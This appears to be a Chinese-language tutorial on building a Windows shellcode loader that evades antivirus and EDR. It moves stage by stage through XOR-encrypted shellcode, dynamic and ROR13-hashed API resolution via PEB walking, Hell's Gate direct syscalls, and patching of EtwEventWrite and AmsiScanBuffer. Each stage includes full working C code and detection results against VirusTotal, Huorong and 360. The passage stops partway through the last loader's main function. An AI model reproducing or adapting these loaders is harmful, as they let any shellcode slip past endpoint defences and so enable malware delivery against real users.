# 0x00

kali生成一个弹出计算器的payload

![image-20260923151345409](README/image-20260923151345409.png)

通过py脚本转成C数组形式，并且定义在shellcode.h 头文件中

```py
import sys
with open("calc_x64.bin", 'rb') as f :
    data = f.read()
print(f"unsigned char shellcode[] ={{") 
for i in range(0,len(data),16):
    chunk = data[i:i+16] # 16字节数一行
    hex_str =', '.join(f'0x{b:02x}' for b in chunk) # 02x至少两位不足补0
    print(f" {hex_str},")
print("};")
print(f"unsigned int shellcode_len = {len(data)};")

```

![image-20260923151428299](README/image-20260923151428299.png)

最简单的loader

```c
#include <windows.h>
#include "shellcode.h"

int main(){
	LPVOID exec_mem = VirtualAlloc(
		NULL,
		shellcode_len,
		MEM_COMMIT | MEM_RESERVE,  //首先申请的一块内存，熟悉是可读可写
		PAGE_READWRITE
		
		);
	
	
	if (exec_mem == NULL){
		return -1;
	}
	
	memcpy(exec_mem, shellcode, shellcode_len); //把shellcode拷贝到申请的内存中
	
	DWORD old_protect;
	VirtualProtect(
		exec_mem,
		shellcode_len,
		PAGE_EXECUTE_READ,  //修改内存属性使其变成可执行可读
		&old_protect
		);
	
	((void(*)())exec_mem)(); //执行shellcode
	return 0;
	
}
```

最终效果如下

![image-20260923151720432](README/image-20260923151720432.png)

https://www.virustotal.com/gui/home/upload 进行检测，发现有大量的爆红 并且识别到了 msf的payload特征

![image-20260923151759327](README/image-20260923151759327.png)

火绒检测落地杀

![image-20260923152237928](README/image-20260923152237928.png)

360检测类似可以成功运行一次被杀

![image-20260923152417291](README/image-20260923152417291.png)

# 0x01

XOR加密和动态API解析

```py
import  sys
def xor_encrypt(data, key):
    return bytes(b ^ key for b in data)

if __name__ == "__main__":
    input_file = sys.argv[1]
    output_file = sys.argv[2]
    key = int(sys.argv[3], 0)

    with open(input_file, "rb") as f:
        data = f.read()

    encrypted = xor_encrypt(data,key)

    with open(output_file, "wb") as f:
        f.write(encrypted)

    print(f"[+] 原始大小: {len(data)} bytes")
    print(f"[+] 加密后大小: {len(encrypted)} bytes")
    print(f"[+] 密钥: 0x{key:02x}")
```

![image-20260923153812587](README/image-20260923153812587.png)

使用0x00的bin2c转成新的头文件

```c
#include <windows.h>
#include "shellcode.h"


void xor_decrypt(unsigned char* data, size_t data_len, unsigned char key ){
	for(size_t i = 0; i < data_len; i++){
		data[i] ^= key;
	}
}

int main(){
	const unsigned XOR_KEY = 0XAA;
	LPVOID exec_mem = VirtualAlloc(
		NULL,
		shellcode_len,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
		
		);
	
	
	
	if (exec_mem == NULL){
		return -1;
	}
	
	memcpy(exec_mem, shellcode, shellcode_len);
	
	xor_decrypt((unsigned char*)exec_mem, shellcode_len, XOR_KEY); //这里进行内存解密
	
	DWORD old_protect;
	VirtualProtect(
		exec_mem,
		shellcode_len,
		PAGE_EXECUTE_READ,
		&old_protect
		);
	
	((void(*)())exec_mem)();
	return 0;
	
}
```

再次上传检测，可以发现XOR起到了一定的作用

![image-20260923155143933](README/image-20260923155143933.png)

现在进行动态API调用，隐藏导入表，再未动态API调用时候可以看见IAT导入表，可以看见VirtualAlloc`、`VirtualProtect等敏感API的名字

![image-20260923155741954](README/image-20260923155741954.png)

```c
#include <windows.h>
#include "shellcode.h"

// ---- 函数指针类型定义 ----
typedef LPVOID (WINAPI* pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI* pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);

// ---- XOR 解密 ----
void xor_decrypt(unsigned char* data, size_t data_len, unsigned char key) {
	for (size_t i = 0; i < data_len; i++) {
		data[i] ^= key;
	}
}

int main() {
	const unsigned char XOR_KEY = 0xAA;
	
	// 第一步：动态获取 API 地址
	HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
	if (hKernel32 == NULL) return 1;
	
	pVirtualAlloc  myVirtualAlloc  = (pVirtualAlloc)
	GetProcAddress(hKernel32, "VirtualAlloc");
	pVirtualProtect myVirtualProtect = (pVirtualProtect)
	GetProcAddress(hKernel32, "VirtualProtect");
	
	if (!myVirtualAlloc || !myVirtualProtect) return 1;
	
	// 第二步：分配可读写内存
	LPVOID exec_mem = myVirtualAlloc(
		NULL,
		shellcode_len,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
		);
	
	if (exec_mem == NULL) return 1;
	
	// 第三步：复制加密的 Shellcode
	memcpy(exec_mem, shellcode, shellcode_len);
	
	// 第四步：在内存中解密
	xor_decrypt((unsigned char*)exec_mem, shellcode_len, XOR_KEY);
	
	// 第五步：修改为可执行
	DWORD old_protect;
	myVirtualProtect(exec_mem, shellcode_len,
		PAGE_EXECUTE_READ, &old_protect);
	
	// 第六步：执行
	((void(*)())exec_mem)();
	
	return 0;
}
```

现在可以看见导入表没有了VirtualAlloc 而存在VirtualProtect是因为在编译阶段MinGW 修改 `.rdata` 段的权限，需要 `VirtualProtect`会进行调用因此导入表还存在VirtualProtect

![image-20260923162219798](README/image-20260923162219798.png)

可以看出来这次扫描出的特征更少

![image-20260923162443586](README/image-20260923162443586.png)

火绒检测落地被杀

![image-20260923162546403](README/image-20260923162546403.png)

360检测也是

![image-20260923162604444](README/image-20260923162604444.png)

# 0x02

API哈希混淆不再去存储VitualAlloc这样的明文字符串，而是存储为hash值，在运行的时候，通过遍历kernel32.dll的导出表，计算每个函数的hash值，与目标哈希做比对来找到对应函数的地址，从而进行规避静态扫描在文件中找到的铭感字符串

降低shellcode的熵值，加密后的shellcode随机性可能比较高可以采用多字节密钥的XOR回执使用Diction 这种编码方式使其熵值维持在一个较低的水平

ROR13哈希算法，对应的函数或者用到的dll文件可以直接算出来

```c
#include <windows.h>
#include <stdio.h>

DWORD hash_ror13(const char* str) {
	DWORD h = 0;
	while (*str) {
		h = (h >> 13) | (h << 19);
		h += (BYTE)*str;
		str++;
	}
	return h;
}

int main(void) {
	const char* samples[] = {
		"kernel32.dll",
		"ntdll.dll",
		"VirtualAlloc",
		"VirtualProtect",
		"LoadLibraryA",
		"GetProcAddress",
		"WinExec",
		"CreateRemoteThread"
	};
	int n = sizeof(samples) / sizeof(samples[0]);
	int i;
	for (i = 0; i < n; i++) {
		printf("%-22s = 0x%08X\n", samples[i], hash_ror13(samples[i]));
	}
	return 0;
}
```

API混淆完整代码

```c
#include <windows.h>
#include <intrin.h>
#include "shellcode.h"

/* ========== 手动定义内部结构体 ========== */

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _PEB_LDR_DATA {
	ULONG      Length;
	BOOLEAN    Initialized;
	PVOID      SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY     InLoadOrderLinks;
	LIST_ENTRY     InMemoryOrderLinks;
	LIST_ENTRY     InInitializationOrderLinks;
	PVOID          DllBase;
	PVOID          EntryPoint;
	ULONG          SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
	BYTE           InheritedAddressSpace;
	BYTE           ReadImageFileExecOptions;
	BYTE           BeingDebugged;
	BYTE           BitField;
	DWORD          Padding0;
	HANDLE         Mutant;
	PVOID          ImageBaseAddress;
	PPEB_LDR_DATA  Ldr;
} PEB, *PPEB;

/* ========== 哈希常量========== */
#define HASH_KERNEL32       0x8FECD63F
#define HASH_VIRTUALALLOC   0x91AFCA54
#define HASH_VIRTUALPROTECT 0x7946C61B

/* ========== 哈希函数：变体 A（ROR then ADD）========== */
static DWORD hash_ror13(const char* str) {
	DWORD h = 0;
	while (*str) {
		h = (h >> 13) | (h << 19);   /* 循环右移 13 位 */
		h += (BYTE)*str++;           /* 加上字符 */
	}
	return h;
}

/* ========== 通过 PEB 遍历获取模块基址 ========== */
HMODULE GetModuleByHash(DWORD moduleHash) {
	PPEB peb = (PPEB)__readgsqword(0x60);
	PPEB_LDR_DATA ldr = peb->Ldr;
	LIST_ENTRY* head = &ldr->InLoadOrderModuleList;
	LIST_ENTRY* current = head->Flink;
	
	while (current != head) {
		PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(
			current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
		UNICODE_STRING* name = &entry->BaseDllName;
		
		/* 将宽字符模块名转为小写 ASCII 并计算哈希 */
		char ansi_name[128] = {0};
		int len = name->Length / sizeof(WCHAR);
		int i;
		if (len > 127) len = 127;
		for (i = 0; i < len; i++) {
			WCHAR c = name->Buffer[i];
			if (c >= L'A' && c <= L'Z') c += 32;  /* 转小写 */
			ansi_name[i] = (char)c;
		}
		
		if (hash_ror13(ansi_name) == moduleHash) {
			return (HMODULE)entry->DllBase;
		}
		current = current->Flink;
	}
	return NULL;
}

/* ========== 通过哈希在导出表中查找函数 ========== */
FARPROC GetApiByHash(HMODULE hModule, DWORD targetHash) {
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(
		(BYTE*)hModule + dosHeader->e_lfanew);
	DWORD exportRva = ntHeaders->OptionalHeader
	.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PIMAGE_EXPORT_DIRECTORY exportDir;
	DWORD* names;
	WORD*  ordinals;
	DWORD* functions;
	DWORD i;
	
	if (exportRva == 0) return NULL;
	exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportRva);
	names     = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
	ordinals  = (WORD*) ((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
	functions = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
	
	for (i = 0; i < exportDir->NumberOfNames; i++) {
		const char* apiName = (const char*)hModule + names[i];
		if (hash_ror13(apiName) == targetHash) {
			return (FARPROC)((BYTE*)hModule + functions[ordinals[i]]);
		}
	}
	return NULL;
}

/* ========== XOR 解密 ========== */
void xor_decrypt(unsigned char* data, size_t data_len, unsigned char key) {
	size_t i;
	for (i = 0; i < data_len; i++) data[i] ^= key;
}

/* ========== 主函数 ========== */
int main(void) {
	typedef LPVOID (WINAPI* pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
	typedef BOOL   (WINAPI* pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
	
	const unsigned char XOR_KEY = 0xAA;
	HMODULE hKernel32;
	pVirtualAlloc  myVirtualAlloc;
	pVirtualProtect myVirtualProtect;
	LPVOID exec_mem;
	DWORD old_protect;
	
	/* 通过哈希获取 kernel32.dll 基址 */
	hKernel32 = GetModuleByHash(HASH_KERNEL32);
	if (hKernel32 == NULL) return 1;
	
	/* 通过哈希获取 API 地址 */
	myVirtualAlloc = (pVirtualAlloc)
	GetApiByHash(hKernel32, HASH_VIRTUALALLOC);
	myVirtualProtect = (pVirtualProtect)
	GetApiByHash(hKernel32, HASH_VIRTUALPROTECT);
	
	if (!myVirtualAlloc || !myVirtualProtect) return 1;
	
	/* 分配可读写内存 */
	exec_mem = myVirtualAlloc(NULL, shellcode_len,
		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (exec_mem == NULL) return 1;
	
	/* 复制加密的 Shellcode 并解密 */
	memcpy(exec_mem, shellcode, shellcode_len);
	xor_decrypt((unsigned char*)exec_mem, shellcode_len, XOR_KEY);
	
	/* 修改为可执行 */
	myVirtualProtect(exec_mem, shellcode_len,
		PAGE_EXECUTE_READ, &old_protect);
	
	/* 执行 */
	((void(*)())exec_mem)();
	
	return 0;
}
```

测试发现火绒和360依旧是落地杀

![image-20260923165556227](README/image-20260923165556227.png)

![image-20260923165621814](README/image-20260923165621814.png)

而且由于变量PEB表等也引入了新的特征导致VT值反而上升了

![image-20260923165653666](README/image-20260923165653666.png)

当然还有一部分原因是因为使用了msf生成的payload 具有很强的指向性，使用自己的payload再次测试一遍



两者落地都没事，火绒静态可以过动态被查出来了 

![image-20260923171643620](README/image-20260923171643620.png)

![image-20260923171617391](README/image-20260923171617391.png)

360主动扫描被查杀

![image-20260923172017309](README/image-20260923172017309.png)

# 0x03

直接系统调用

`ntdll.dll` 是 Windows 内核态和用户态之间最重要的桥梁，**所有 Win32 API 最终几乎都会调用 ntdll 里的 Nt\* 系统调用函数**（NtOpenProcess、NtAllocateVirtualMemory、NtProtectVirtualMemory 等 kernel32.dll → ntdll.dll → 内核系统调用 → 操作系统内核

当用户调用相关API的时候会调用Nt*相关函数，进而调用杀软的钩子，杀软可以知道这个程序申请了什么空间什么权限进而判断是不是而已程序。

不使用系统调用前EDR会通过一些hook来检测是否调用了一些敏感的API，使用系统调用尝试绕过一些hook

```c
#include <windows.h>
#include <intrin.h>
#include "shellcode.h"

/* ========== 类型定义 ========== */
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define NtCurrentProcess() ((HANDLE)-1)

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _PEB_LDR_DATA {
	ULONG      Length;
	BOOLEAN    Initialized;
	PVOID      SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY     InLoadOrderLinks;
	LIST_ENTRY     InMemoryOrderLinks;
	LIST_ENTRY     InInitializationOrderLinks;
	PVOID          DllBase;
	PVOID          EntryPoint;
	ULONG          SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
	BYTE           InheritedAddressSpace;
	BYTE           ReadImageFileExecOptions;
	BYTE           BeingDebugged;
	BYTE           BitField;
	DWORD          Padding0;
	HANDLE         Mutant;
	PVOID          ImageBaseAddress;
	PPEB_LDR_DATA  Ldr;
} PEB, *PPEB;

typedef NTSTATUS (NTAPI* pNtAllocateVirtualMemory)(
	HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI* pNtProtectVirtualMemory)(
	HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

/* ========== 哈希常量（全部来自变体 A 实测值） ========== */
#define HASH_NTDLL          0xCEF6E822   /* ntdll.dll */
#define HASH_NTALLOCATE     0xD33BCABD   /* NtAllocateVirtualMemory */
#define HASH_NTPROTECT      0x8C394D89   /* NtProtectVirtualMemory */

/* ========== ROR13 变体 A 哈希函数 ========== */
static DWORD hash_ror13(const char* str) {
	DWORD h = 0;
	while (*str) {
		h = (h >> 13) | (h << 19);
		h += (BYTE)*str++;
	}
	return h;
}

/* ========== 通过 PEB 遍历获取模块基址 ========== */
HMODULE GetModuleByHash(DWORD moduleHash) {
	PPEB peb = (PPEB)__readgsqword(0x60);
	PPEB_LDR_DATA ldr = peb->Ldr;
	LIST_ENTRY* head = &ldr->InLoadOrderModuleList;
	LIST_ENTRY* current = head->Flink;
	
	while (current != head) {
		PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(
			current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
		UNICODE_STRING* name = &entry->BaseDllName;
		
		/* 模块名转小写 ASCII */
		char ansi_name[128] = {0};
		int len = name->Length / sizeof(WCHAR);
		int i;
		if (len > 127) len = 127;
		for (i = 0; i < len; i++) {
			WCHAR c = name->Buffer[i];
			if (c >= L'A' && c <= L'Z') c += 32;
			ansi_name[i] = (char)c;
		}
		
		if (hash_ror13(ansi_name) == moduleHash)
			return (HMODULE)entry->DllBase;
		current = current->Flink;
	}
	return NULL;
}

/* ========== 通过哈希在导出表中查找函数 ========== */
FARPROC GetApiByHash(HMODULE hModule, DWORD targetHash) {
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(
		(BYTE*)hModule + dosHeader->e_lfanew);
	DWORD exportRva = ntHeaders->OptionalHeader
	.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PIMAGE_EXPORT_DIRECTORY exportDir;
	DWORD* names;
	WORD*  ordinals;
	DWORD* functions;
	DWORD i;
	
	if (exportRva == 0) return NULL;
	exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportRva);
	names     = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
	ordinals  = (WORD*) ((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
	functions = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
	
	for (i = 0; i < exportDir->NumberOfNames; i++) {
		const char* apiName = (const char*)hModule + names[i];
		if (hash_ror13(apiName) == targetHash) {
			return (FARPROC)((BYTE*)hModule + functions[ordinals[i]]);
		}
	}
	return NULL;
}

/* ========== Hell's Gate：从 ntdll 读 SSN（用哈希定位函数） ========== */
DWORD GetSSN(HMODULE hNtdll, DWORD funcHash) {
	/* 用哈希查函数地址——不再用 GetProcAddress */
	BYTE* funcAddr = (BYTE*)GetApiByHash(hNtdll, funcHash);
	if (!funcAddr) return 0;
	
	/* 检查是否被 Hook */
	if (funcAddr[0] == 0xE9) {
		/* 被 Hook，需要 Halo's Gate；此处简化返回 0 */
		return 0;
	}
	
	/* 验证 syscall stub 开头: 4C 8B D1 B8 ... */
	if (funcAddr[0] != 0x4C || funcAddr[1] != 0x8B || funcAddr[2] != 0xD1) {
		return 0;
	}
	
	/* 读取 SSN */
	return *(DWORD*)(funcAddr + 4);
}

/* ========== 动态生成 syscall stub ========== */
void* CreateSyscallStub(DWORD ssn) {
	BYTE* stub = (BYTE*)VirtualAlloc(NULL, 12,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!stub) return NULL;
	
	stub[0] = 0x4C; stub[1] = 0x8B; stub[2] = 0xD1;   /* mov r10, rcx */
	stub[3] = 0xB8;                                     /* mov eax, imm32 */
	*(DWORD*)(stub + 4) = ssn;
	stub[8] = 0x0F; stub[9] = 0x05;                    /* syscall */
	stub[10] = 0xC3;                                    /* ret */
	stub[11] = 0x00;
	
	return stub;
}

/* ========== XOR 解密 ========== */
void xor_decrypt(unsigned char* data, size_t len, unsigned char key) {
	size_t i;
	for (i = 0; i < len; i++) data[i] ^= key;
}

/* ========== 主函数 ========== */
int main(void) {
	const unsigned char XOR_KEY = 0xAA;
	HMODULE hNtdll;
	pNtAllocateVirtualMemory myNtAllocateVirtualMemory;
	pNtProtectVirtualMemory myNtProtectVirtualMemory;
	PVOID exec_mem;
	SIZE_T region_size;
	ULONG old_protect;
	NTSTATUS status;
	DWORD ssnAlloc, ssnProtect;
	
	/* 1. PEB 遍历获取 ntdll.dll 基址（无字符串） */
	hNtdll = GetModuleByHash(HASH_NTDLL);
	if (hNtdll == NULL) return 1;
	
	/* 2. 哈希定位函数 + Hell's Gate 读 SSN（无字符串） */
	ssnAlloc   = GetSSN(hNtdll, HASH_NTALLOCATE);
	ssnProtect = GetSSN(hNtdll, HASH_NTPROTECT);
	if (ssnAlloc == 0 || ssnProtect == 0) return 1;
	
	/* 3. 生成 syscall stub */
	myNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)
	CreateSyscallStub(ssnAlloc);
	myNtProtectVirtualMemory = (pNtProtectVirtualMemory)
	CreateSyscallStub(ssnProtect);
	if (!myNtAllocateVirtualMemory || !myNtProtectVirtualMemory) return 1;
	
	/* 4. 分配可读写内存（直接 syscall） */

	exec_mem = NULL;
	region_size = shellcode_len;
	status = myNtAllocateVirtualMemory(
		NtCurrentProcess(), &exec_mem, 0, &region_size,
		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!NT_SUCCESS(status)) return 1;
	
	/* 5. 写入并 XOR 解密 */
	memcpy(exec_mem, shellcode, shellcode_len);
	xor_decrypt((unsigned char*)exec_mem, shellcode_len, XOR_KEY);
	
	/* 6. 改为可执行（直接 syscall） */
	status = myNtProtectVirtualMemory(
		NtCurrentProcess(), &exec_mem, &region_size,
		PAGE_EXECUTE_READ, &old_protect);
	if (!NT_SUCCESS(status)) return 1;
	
	/* 7. 执行 */
	((void(*)())exec_mem)();
	
	return 0;
}
```

但是异或单字节加密以及hash常量导致被查杀

![image-20260924100326368](README/image-20260924100326368.png)

![image-20260923175803477](README/image-20260923175803477.png)

![image-20260923175816899](README/image-20260923175816899.png)

![image-20260923175833224](README/image-20260923175833224.png)

高级 EDR 不单单 hook 用户态 ntdll：

- 在内核监控系统调用表（SSDT），直接拦截内核层面的 Nt 系统调用
- 就算恶意代码绕过 ntdll 用户态 hook，直接手工汇编执行 syscall，内核侧依然能捕获。

# 0x04

ETW与AMSI绕过

ETW = Event Tracing for Windows，Windows 原生事件日志框架，即使绕过了用户态的HOOK但是syscall等信息也会通过ETW ntdll!EtwEventWrite 上报给EDR

AMSI = Antimalware Scan Interface，Windows 提供给杀毒软件的通用扫描接口  amsi.dll!AmsiScanBuffer  在内存中扫描脚本和.NET程序集

`ntdll!EtwEventWrite` 是Windows事件追踪的入口函数。EDR订阅了ETW提供器后，任何调用 `EtwEventWrite` 的操作都会被上报。

**绕过方法**：将 `EtwEventWrite` 函数的开头字节修改为 `0xC3`（`ret`），函数直接返回，不执行任何事件写入。对于x64，更安全的patch是 `48 33 C0 C3`（`xor rax, rax; ret`），这样返回值 `RAX = 0`（`STATUS_SUCCESS`），避免因返回值异常引起注意

`amsi.dll!AmsiScanBuffer` 是AMSI的核心扫描函数。当PowerShell、.NET程序集等在内存中被加载时，会调用这个函数进行扫描。

**绕过方法**：将 `AmsiScanBuffer` 的开头字节修改为返回 `E_INVALIDARG`（`0x80070057`）。AMSI调用者收到这个错误后，会认为“扫描失败”，走**fail-open**路径——即扫描失败时默认放行

patch顺序 必须先Patch ETW，再Patch AMSI。

原因：如果先Patch AMSI，EDR会通过ETW收到“AMSI函数被篡改”的告警。

Patch ETW/AMSI函数需要修改 `ntdll.dll` 和 `amsi.dll` 的内存权限。**不能用 `VirtualProtect`**而是直接进行系统调用NtProtectVirtualMemory

![image-20260924111630193](README/image-20260924111630193.png)

![image-20260924140424191](README/image-20260924140424191.png)

```C
#include <windows.h>
#include <intrin.h>
#include "shellcode.h"

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define NtCurrentProcess() ((HANDLE)-1)

/* ========== 类型定义 ========== */
typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _PEB_LDR_DATA {
	ULONG      Length;
	BOOLEAN    Initialized;
	PVOID      SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY     InLoadOrderLinks;
	LIST_ENTRY     InMemoryOrderLinks;
	LIST_ENTRY     InInitializationOrderLinks;
	PVOID          DllBase;
	PVOID          EntryPoint;
	ULONG          SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
	BYTE           InheritedAddressSpace;
	BYTE           ReadImageFileExecOptions;
	BYTE           BeingDebugged;
	BYTE           BitField;
	DWORD          Padding0;
	HANDLE         Mutant;
	PVOID          ImageBaseAddress;
	PPEB_LDR_DATA  Ldr;
} PEB, *PPEB;

typedef NTSTATUS (NTAPI* pNtAllocateVirtualMemory)(
	HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI* pNtProtectVirtualMemory)(
	HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

/* ========== 哈希常量（全部来自你本机诊断） ========== */
#define HASH_NTDLL          0xCEF6E822   /* ntdll.dll */
#define HASH_AMSI           0xE11AB5C5   /* amsi.dll */
#define HASH_NTALLOCATE     0xD33BCABD   /* NtAllocateVirtualMemory */
#define HASH_NTPROTECT      0x8C394D89   /* NtProtectVirtualMemory  */
#define HASH_ETWEVENTWRITE  0x2047C3EE   /* EtwEventWrite           */
#define HASH_AMSISCANBUFFER 0x9550151E   /* AmsiScanBuffer          */

/* ========== ROR13 哈希函数 ========== */
static DWORD hash_ror13(const char* str) {
	DWORD h = 0;
	while (*str) {
		h = (h >> 13) | (h << 19);
		h += (BYTE)*str++;
	}
	return h;
}

/* ========== PEB 遍历获取模块基址 ========== */
HMODULE GetModuleByHash(DWORD moduleHash) {
	PPEB peb = (PPEB)__readgsqword(0x60);
	PPEB_LDR_DATA ldr = peb->Ldr;
	LIST_ENTRY* head = &ldr->InLoadOrderModuleList;
	LIST_ENTRY* current = head->Flink;
	
	while (current != head) {
		PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(
			current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
		UNICODE_STRING* name = &entry->BaseDllName;
		
		char ansi_name[128] = {0};
		int len = name->Length / sizeof(WCHAR);
		int i;
		if (len > 127) len = 127;
		for (i = 0; i < len; i++) {
			WCHAR c = name->Buffer[i];
			if (c >= L'A' && c <= L'Z') c += 32;
			ansi_name[i] = (char)c;
		}
		
		if (hash_ror13(ansi_name) == moduleHash)
			return (HMODULE)entry->DllBase;
		current = current->Flink;
	}
	return NULL;
}

/* ========== 导出表哈希查找 ========== */
FARPROC GetApiByHash(HMODULE hModule, DWORD targetHash) {
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(
		(BYTE*)hModule + dosHeader->e_lfanew);
	DWORD exportRva = ntHeaders->OptionalHeader
	.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PIMAGE_EXPORT_DIRECTORY exportDir;
	DWORD* names;
	WORD*  ordinals;
	DWORD* functions;
	DWORD i;
	
	if (exportRva == 0) return NULL;
	exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportRva);
	names     = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
	ordinals  = (WORD*) ((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
	functions = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
	
	for (i = 0; i < exportDir->NumberOfNames; i++) {
		const char* apiName = (const char*)hModule + names[i];
		if (hash_ror13(apiName) == targetHash) {
			return (FARPROC)((BYTE*)hModule + functions[ordinals[i]]);
		}
	}
	return NULL;
}

/* ========== Hell's Gate ========== */
DWORD GetSSN(HMODULE hNtdll, DWORD funcHash) {
	BYTE* funcAddr = (BYTE*)GetApiByHash(hNtdll, funcHash);
	if (!funcAddr) return 0;
	if (funcAddr[0] == 0xE9) return 0;
	if (funcAddr[0] != 0x4C || funcAddr[1] != 0x8B || funcAddr[2] != 0xD1)
		return 0;
	return *(DWORD*)(funcAddr + 4);
}

/* ========== 动态生成 syscall stub ========== */
void* CreateSyscallStub(DWORD ssn) {
	BYTE* stub = (BYTE*)VirtualAlloc(NULL, 12,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!stub) return NULL;
	
	stub[0] = 0x4C; stub[1] = 0x8B; stub[2] = 0xD1;
	stub[3] = 0xB8;
	*(DWORD*)(stub + 4) = ssn;
	stub[8] = 0x0F; stub[9] = 0x05;
	stub[10] = 0xC3;
	stub[11] = 0x00;
	return stub;
}

/* ========== XOR 解密 ========== */
void xor_decrypt(unsigned char* data, size_t len, unsigned char key) {
	size_t i;
	for (i = 0; i < len; i++) data[i] ^= key;
}

/* ========== Patch 函数 ========== */
BOOL PatchFunction(BYTE* targetAddr, const BYTE* patchBytes, SIZE_T patchSize,
	pNtProtectVirtualMemory myNtProtect) {
		SIZE_T region_size = 4096;
		ULONG old_protect = 0;
		NTSTATUS status;
		PVOID addr = targetAddr;
		
		status = myNtProtect(NtCurrentProcess(), &addr,
			&region_size, PAGE_READWRITE, &old_protect);
		if (!NT_SUCCESS(status)) return FALSE;
		
		memcpy(targetAddr, patchBytes, patchSize);
		
		addr = targetAddr;
		region_size = 4096;
		status = myNtProtect(NtCurrentProcess(), &addr,
			&region_size, old_protect, &old_protect);
		if (!NT_SUCCESS(status)) return FALSE;
		
		return TRUE;
	}

/* ========== 主函数 ========== */
int main(void) {
	const unsigned char XOR_KEY = 0xAA;
	HMODULE hNtdll;
	pNtAllocateVirtualMemory myNtAllocateVirtualMemory;
	pNtProtectVirtualMemory myNtProtectVirtualMemory;
	PVOID exec_mem;
	SIZE_T region_size;
	ULONG old_protect;
	NTSTATUS status;
	DWORD ssnAlloc, ssnProtect;
	
	/* ---------- 第一步：初始化 SSN 与 syscall stub ---------- */
	hNtdll = GetModuleByHash(HASH_NTDLL);
	if (hNtdll == NULL) return 1;
	
	ssnAlloc   = GetSSN(hNtdll, HASH_NTALLOCATE);
	ssnProtect = GetSSN(hNtdll, HASH_NTPROTECT);
	if (ssnAlloc == 0 || ssnProtect == 0) return 1;
	
